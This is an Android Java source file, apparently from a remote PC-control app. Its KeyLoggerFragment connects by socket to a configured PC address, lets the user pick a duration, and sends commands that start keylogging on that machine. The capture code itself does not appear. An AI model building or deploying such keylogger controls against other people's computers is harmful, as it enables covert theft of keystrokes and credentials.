package ainaa.acup.slidingmenu;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.Inet4Address;
import java.net.Socket;

import ainaa.acup.data.Data;
import ainaa.acup.manager.KeyLoggerManager;
import ainna.acup.client.R;
import android.app.AlertDialog;
import android.app.Fragment;
import android.content.DialogInterface;
import android.graphics.Color;
import android.os.Bundle;
import android.view.LayoutInflater;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.ViewGroup;
import android.widget.AdapterView;
import android.widget.AdapterView.OnItemSelectedListener;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.CheckBox;
import android.widget.LinearLayout;
import android.widget.Spinner;

public class KeyLoggerFragment extends Fragment {
	private LinearLayout layout;
	private Spinner hourspinner, minsspinner;
	private Button button;
	private String hours = "0", minutes = "0";
	private CheckBox check;
	private int port;
	private String ip;
	
	@Override
	public View onCreateView(LayoutInflater inflater, ViewGroup container,
			Bundle savedInstanceState) {

		try {
			port = Integer.parseInt(getActivity().getResources().getString(R.string.access_port));
			ip = Data.getInstance(getActivity()).getValue(getActivity().getResources().getString(R.string.pc_ip));
			MainActivity.socket = new Socket(Inet4Address.getByName(ip).getHostAddress(), port);
			MainActivity.objectOut = new ObjectOutputStream(MainActivity.socket.getOutputStream());
			MainActivity.objectIn = new ObjectInputStream(MainActivity.socket.getInputStream());
			
			MainActivity.objectOut.writeObject("keylogging");
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		layout = (LinearLayout) inflater.inflate(R.layout.fragment_keylogger,
				container, false);
		hourspinner = (Spinner) layout.findViewById(R.id.spnhours);
		minsspinner = (Spinner) layout.findViewById(R.id.spnmins);
		button = (Button) layout.findViewById(R.id.btnsettime);
		ArrayAdapter<CharSequence> adapter = ArrayAdapter.createFromResource(
				getActivity(), R.array.hours,
				android.R.layout.simple_spinner_item);
		adapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
		hourspinner.setAdapter(adapter);
		hourspinner.setOnItemSelectedListener(new OnItemSelectedListener() {

			@Override
			public void onItemSelected(AdapterView<?> parent, View view,
					int position, long id) {
				hours = (String) hourspinner.getItemAtPosition(position);
			}

			@Override
			public void onNothingSelected(AdapterView<?> parent) {
			}
		});
		ArrayAdapter<CharSequence> adapter1 = ArrayAdapter.createFromResource(
				getActivity(), R.array.mins,
				android.R.layout.simple_spinner_item);
		adapter1.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
		minsspinner.setAdapter(adapter1);
		minsspinner.setOnItemSelectedListener(new OnItemSelectedListener() {

			@Override
			public void onItemSelected(AdapterView<?> parent, View view,
					int position, long id) {
				minutes = (String) minsspinner.getItemAtPosition(position);
			}

			@Override
			public void onNothingSelected(AdapterView<?> parent) {
			}
		});
		button.setOnClickListener(new OnClickListener() {

			public void onClick(View v) {
				LinearLayout layout = new LinearLayout(getActivity().getApplicationContext());
				layout.setOrientation(LinearLayout.VERTICAL);
				layout.setBackgroundColor(Color.GRAY);
				 check = new CheckBox(getActivity().getApplicationContext());
				check.setText("download here?");
				check.setTextColor(Color.BLACK);
				check.setChecked(true);
				layout.addView(check);
				new AlertDialog.Builder(getActivity())
						.setIcon(R.drawable.ic_keylogger)
						.setTitle("Keylogger")
						.setMessage("Do you want start key logging?")
						.setPositiveButton("Yes",
								new DialogInterface.OnClickListener() {

									@Override
									public void onClick(DialogInterface dialog,
											int which) {
										try {
										if(check.isChecked())
										{
											MainActivity.objectOut.writeObject("keylogger_yes");
											new Thread(new KeyLoggerManager(getActivity(),hours,minutes,true)).start();
										}
										else {
											MainActivity.objectOut.writeObject("keylogger_no");
											new Thread(new KeyLoggerManager(getActivity(),hours,minutes,false)).start();
										}
										} catch (IOException e) {
											// TODO Auto-generated catch block
											e.printStackTrace();
										}
									}
								})
						.setNegativeButton("No",
								new DialogInterface.OnClickListener() {

									@Override
									public void onClick(DialogInterface arg0,
											int arg1) {
									}
								}).show();
			}
		});
		
		
		
		
		return layout;
	}

	

}
